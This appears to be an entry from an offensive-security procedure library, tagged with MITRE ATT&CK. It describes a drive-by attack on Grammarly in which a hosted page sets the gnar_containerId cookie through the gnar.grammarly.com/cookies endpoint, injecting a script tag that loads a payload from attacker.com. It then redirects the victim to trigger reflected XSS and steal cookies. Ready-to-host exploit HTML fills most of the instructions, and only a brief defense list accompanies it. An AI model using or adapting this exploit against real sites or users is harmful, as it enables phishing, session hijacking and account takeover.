---
tags:
  - cookie-manipulation
  - xss-injection
type: procedure
tools:
  - '[[tools/jQuery]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: bb382bc3-5600-4df1-89bf-f032267098c4
created_at: '2025-12-14T00:11:16.523Z'
updated_at: '2025-12-14T00:11:16.523Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Host Malicious Webpage for Cookie Manipulation

## Summary

This procedure involves hosting a malicious HTTPS webpage that uses jQuery to manipulate cookies on Grammarly domains, injecting an XSS payload via the gnar_containerId cookie to enable further exploitation.

## Description

The attack targets the gnar.grammarly.com/cookies endpoint, which allows arbitrary cookie setting for *.grammarly.com domains without proper checks. By setting gnar_containerId to include script tags, it triggers a reflected XSS on www.grammarly.com in a noscript tag, bypassing sanitization. This is used in phishing scenarios where victims are lured to the malicious page.

## Requirements

1. HTTPS-enabled web server to host the malicious HTML
2. Access to jQuery library
3. Knowledge of the target endpoint and cookie behavior

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization for cookie values in DOM reflections
- Use Content Security Policy (CSP) to restrict script sources
- Monitor for unusual cookie manipulations in logs

## Objectives

1. Manipulate gnar_containerId cookie to inject XSS
2. Redirect victim to trigger the vulnerability
3. Enable cookie theft in subsequent steps

## Instructions

### Step 1: Set Up Malicious HTML

**Context**: Create and host the HTML that sends the POST request to set the cookie.

Execute the following in your HTML file using [[tools/jQuery]]:

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
$.post("https://gnar.grammarly.com/cookies", {name: "gnar_containerId", value: "<script src=\"https://attacker.com/poc.js\"></script>", domain: ".grammarly.com"});
window.location = "https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal";
</script>
```

> This sets the cookie and redirects to the vulnerable page.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques



## Commands Used



## Tools Used

- [[tools/jQuery]]

## Tags

- [[cookie-manipulation]]
- [[xss-injection]]
